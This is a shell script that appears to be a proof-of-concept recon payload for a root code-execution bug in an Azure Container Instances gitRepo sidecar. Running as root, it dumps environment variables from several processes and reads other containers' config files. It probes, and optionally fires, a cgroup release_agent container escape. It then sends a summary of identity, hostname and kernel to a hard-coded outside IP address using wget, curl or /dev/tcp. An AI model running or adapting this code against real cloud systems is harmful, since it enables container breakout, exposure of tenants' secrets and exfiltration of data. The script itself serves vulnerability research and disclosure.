#!/bin/sh
# _recon.sh — recon body for the ACI gitRepo sidecar PoC.
# Called SYNCHRONOUSLY by _dispatch.sh: the local report (all fast /proc reads) is
# written to the gitRepo VOLUME first — that file persists after the ephemeral sidecar
# is torn down and is mounted into the user container (retrievable via az container
# exec). Only the slow OOB GET (and the optional release_agent fire) are detached at
# the end so they cannot delay the clone / hang the container.
#
# Runs as ROOT in the privileged aci-atlas-sidecar-gitrepo container.

WORKTREE="${1:-$(pwd)}"
OUT="RECON_ACI_GITREPO.txt"

# ── Out-of-band collector (OPTIONAL) ──────────────────────────────────────────
# In-band retrieval needs NONE of this. Set to "" to disable OOB entirely.
# Default = the live research collector (RG aci-collector). Change per engagement.
OOB_HOST="4.157.206.88"
OOB_PORT="80"

# ── cgroup release_agent fire (OPT-IN, default OFF) ───────────────────────────
# Inspection below is always non-destructive. Setting this to 1 additionally fires
# a CONTAINED release_agent that only writes a marker (hostname/id) wherever it
# executes — used to confirm the "we land in our own utility VM" hypothesis.
DO_CGROUP_FIRE=0

# ── Collect ───────────────────────────────────────────────────────────────────
report() {
    echo "=== ACI gitRepo sidecar recon — root code execution confirmed ==="
    echo "## when (sidecar clock)"; date -u 2>&1
    echo "## id";        id 2>&1
    echo "## uname";     uname -a 2>&1
    echo "## hostname";  hostname 2>&1
    echo "## self cgroup"; cat /proc/self/cgroup 2>&1
    echo "## pid1 cgroup"; cat /proc/1/cgroup 2>&1
    echo "## capabilities (/proc/self/status)"; grep -iE 'Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status 2>&1
    echo "## cgroup fs layout (/sys/fs/cgroup)"; ls -la /sys/fs/cgroup 2>&1

    echo "## ===== PROCESSES IN SHARED PID NAMESPACE ====="
    echo "## (sidecar shares pid/net/ipc with the pod sandbox; this lists every"
    echo "##  process visible from inside the sidecar — i.e. our utility-VM neighbours)"
    if command -v ps >/dev/null 2>&1; then
        echo "## --- ps -ef ---"; ps -ef 2>&1 || ps aux 2>&1
    fi
    echo "## --- /proc walk (pid uid root-fs comm :: cmdline) ---"
    for d in /proc/[0-9]*; do
        pid=${d#/proc/}
        comm=$(cat "$d/comm" 2>/dev/null)
        uid=$(awk '/^Uid:/{print $2}' "$d/status" 2>/dev/null)
        root=$(readlink "$d/root" 2>/dev/null)
        cmd=$(tr '\0' ' ' < "$d/cmdline" 2>/dev/null)
        cg=$(awk -F: 'NR==1{print $3}' "$d/cgroup" 2>/dev/null)
        printf 'pid=%-6s uid=%-5s root=%-40s comm=%-16s cg=%s :: %s\n' \
            "$pid" "$uid" "${root:-?}" "${comm:-?}" "${cg:-?}" "${cmd:-?}"
    done

    echo "## ===== cgroup escape surface (non-destructive) ====="
    echo "## /sys/fs/cgroup mount line"; grep -E ' cgroup| cgroup2' /proc/mounts 2>&1
    echo "## release_agent present?"; ls -la /sys/fs/cgroup/*/release_agent /sys/fs/cgroup/release_agent 2>&1
    echo "## can we mount a fresh cgroup hierarchy?"
    mkdir -p /tmp/.cgtest 2>/dev/null
    if mount -t cgroup -o rdma cgroup /tmp/.cgtest 2>/tmp/.cgerr; then
        echo "   MOUNT OK -> /tmp/.cgtest"
        echo "   release_agent writable?"; [ -w /tmp/.cgtest/release_agent ] && echo "   YES (writable)" || echo "   no"
        umount /tmp/.cgtest 2>/dev/null
    else
        echo "   mount failed: $(cat /tmp/.cgerr 2>/dev/null)"
    fi
    rmdir /tmp/.cgtest 2>/dev/null

    echo "## host block devices visible"; ls -la /dev/sd* /dev/loop* 2>&1
    echo "## mounts (head)"; head -40 /proc/mounts 2>&1

    echo "## ===== VM / SERVICE FABRIC MESH HUNT ====="
    echo "## --- env: sidecar ---";    cat /proc/self/environ 2>/dev/null | tr '\0' '\n'
    echo "## --- env: pid1 (pause) ---"; cat /proc/1/environ 2>/dev/null | tr '\0' '\n'
    echo "## --- env: mount_git (pid of /mount_git.sh) ---"
    for p in /proc/[0-9]*; do
        grep -qa 'mount_git' "$p/cmdline" 2>/dev/null && cat "$p/environ" 2>/dev/null | tr '\0' '\n'
    done
    echo "## --- resolv.conf / hosts (cluster domain) ---"; cat /etc/resolv.conf /etc/hosts 2>&1
    echo "## --- ip addr / route (shared netns) ---"; (ip addr; ip route) 2>&1 || ifconfig -a 2>&1
    echo "## --- listening + established sockets (control-plane?) ---"
    (ss -tanp 2>/dev/null || netstat -tanp 2>/dev/null) | head -60
    echo "## --- /proc/net/tcp (raw, in case no ss/netstat) ---"; head -40 /proc/net/tcp 2>&1
    echo "## --- GCS state dir /run/gcs/c (host's view of EVERY container in this VM) ---"
    ls -la /run/gcs/c/ 2>&1 | head -40
    for c in /run/gcs/c/*/config.json; do
        [ -f "$c" ] && { echo "## == $c =="; head -c 4000 "$c" 2>/dev/null; echo; }
    done
    echo "## --- other container rootfs roots in this VM ---"; ls -la /run/gcs/c/*/rootfs 2>/dev/null | head -40
    echo "## --- fabric/atlas/seabreeze/mesh/caas files on reachable fs (timeboxed) ---"
    find /run/gcs /mnt /opt /var/lib /usr/local /etc /tmp -maxdepth 6 \
        \( -iname '*fabric*' -o -iname '*atlas*' -o -iname '*seabreeze*' -o -iname '*mesh*' -o -iname '*caas*' -o -iname '*gcs*' \) \
        2>/dev/null | head -120
    echo "## --- guest agent / GCS binaries ---"; ls -la /run/gcs /bin/gcs* /usr/bin/gcs* 2>/dev/null | head -20
}

report > "$WORKTREE/$OUT" 2>&1

# ── Optional contained release_agent marker (confirms which VM we land in) ─────
if [ "$DO_CGROUP_FIRE" = "1" ]; then
    {
        d=/tmp/.cgfire
        mkdir -p "$d" 2>/dev/null
        if mount -t cgroup -o memory cgroup "$d" 2>/dev/null || mount -t cgroup -o rdma cgroup "$d" 2>/dev/null; then
            mkdir -p "$d/x" 2>/dev/null
            host=$(sed -n 's#.*/run/gcs/c/\([0-9a-f]*\)/.*#\1#p' /proc/mounts | head -1)
            agent="/tmp/.cgagent_$$.sh"
            printf '#!/bin/sh\n{ echo "release_agent fired"; date -u; id; hostname; uname -a; head -5 /proc/1/cgroup; } > %s/RELEASE_AGENT_PROOF.txt 2>&1\n' "$WORKTREE" > "$agent"
            chmod +x "$agent"
            echo "$agent" > "$d/release_agent" 2>/dev/null
            echo 1 > "$d/x/notify_on_release" 2>/dev/null
            # entering+leaving the cgroup with no tasks triggers release_agent
            sh -c "echo \$\$ > $d/x/cgroup.procs; echo \$\$ > $d/cgroup.procs" 2>/dev/null
        fi
    } >/dev/null 2>&1
fi

# ── Fallback in-band drops (common user-container mount paths) ─────────────────
for p in /mount/gitrepo /mount/gitrepo/mnt /tmp/hooks /mnt/repo /tmp; do
    cp "$WORKTREE/$OUT" "$p/$OUT" 2>/dev/null || true
done

# ── Out-of-band compact summary (DETACHED — never delays the clone) ───────────
# Backgrounded so a slow/blocked connect cannot hang the hook. The full report is
# already durable in the volume by this point, so losing the OOB GET costs nothing.
if [ -n "$OOB_HOST" ]; then
    who=$(id 2>/dev/null | tr ' ' '+' )
    host=$(hostname 2>/dev/null)
    kern=$(uname -r 2>/dev/null)
    nproc=$(ls -d /proc/[0-9]* 2>/dev/null | wc -l | tr -d ' ')
    q="/?poc=gitrepo-rce&id=${who}&host=${host}&kr=${kern}&nproc=${nproc}"
    setsid /bin/sh -c '
        if command -v wget >/dev/null 2>&1; then
            wget -q -T 8 -O /dev/null "http://'"${OOB_HOST}:${OOB_PORT}${q}"'"
        elif command -v curl >/dev/null 2>&1; then
            curl -s -m 8 -o /dev/null "http://'"${OOB_HOST}:${OOB_PORT}${q}"'"
        else
            bash -c "exec 3<>/dev/tcp/'"${OOB_HOST}"'/'"${OOB_PORT}"'; printf \"GET '"${q}"' HTTP/1.0\r\nHost: '"${OOB_HOST}"'\r\n\r\n\" >&3; cat <&3 >/dev/null"
        fi
    ' </dev/null >/dev/null 2>&1 &
fi

exit 0
